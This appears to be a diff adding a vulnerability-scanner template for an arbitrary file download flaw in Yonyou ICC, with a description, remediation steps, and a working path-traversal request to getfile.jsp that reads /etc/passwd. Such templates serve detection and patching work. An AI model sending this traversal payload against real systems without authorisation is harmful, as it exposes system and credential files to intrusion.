@@ -1,0 +1,37 @@
+id: yonyou_ICC-download-getfile
+info:
+  name: Yonyou ICC getfile Arbitrary File Download Vulnerability
+  author:
+  - 折跃
+  description: |-
+    Yonyou ICC Arbitrary File Download Vulnerability
+    Yonyou ICC is Yonyou's enterprise-level Internet call center and application solution. ICC stands for "Internet Call Center".
+
+    Yonyou ICC has an arbitrary file download vulnerability. Attackers can exploit it to read the contents of arbitrary files.
+  severity: medium
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.yonyou.com/
+
+    Temporary remediation:
+    1. Filter "." so that users cannot navigate to parent directories from URLs.
+    2. Strictly validate the format of user input parameters with regular expressions, hardcode or uniformly encode the filename parameters passed by users, whitelist file types, and reject parameters containing malicious or empty characters.
+    3. Disable directory traversal services; for example, configure open_basedir in php.ini to restrict the file access scope.
+    4. Store file paths in the database and allow users to download files by submitting the corresponding file ID.
+    5. Verify user permissions before file downloads.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - regex('root:.*:0:0:',body)
+  path:
+  - '{{BaseURL}}/web/common/getfile.jsp?p=..\..\..\..\etc\passwd'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
